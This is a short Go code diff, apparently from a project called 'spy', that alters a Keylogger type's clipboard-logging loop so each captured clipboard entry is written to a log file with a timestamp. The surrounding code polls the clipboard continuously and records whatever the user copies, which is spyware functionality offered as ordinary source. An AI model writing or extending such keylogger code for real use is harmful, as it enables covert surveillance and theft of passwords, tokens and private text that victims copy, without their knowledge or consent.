@@ -7,6 +7,7 @@ import (
 	"time"
 
 	"github.com/atotto/clipboard"
+	"github.com/cinus-e/spy/internal/util"
 )
 
 type Keylogger struct {
@@ -52,7 +53,7 @@ func (l *Keylogger) RunClipboardLogger() {
 	for l.isClipboardLogging {
 		text, _ := clipboard.ReadAll()
 		if text != tmp {
-			if _, err := l.file.Write([]byte(fmt.Sprintf("\nClipboard[%s]\n", text))); err != nil {
+			if _, err := l.file.Write([]byte(fmt.Sprintf("\n%s[Clipboard]\n%s\n", util.Now(), text))); err != nil {
 				fmt.Println(err)
 			}
 			tmp = text
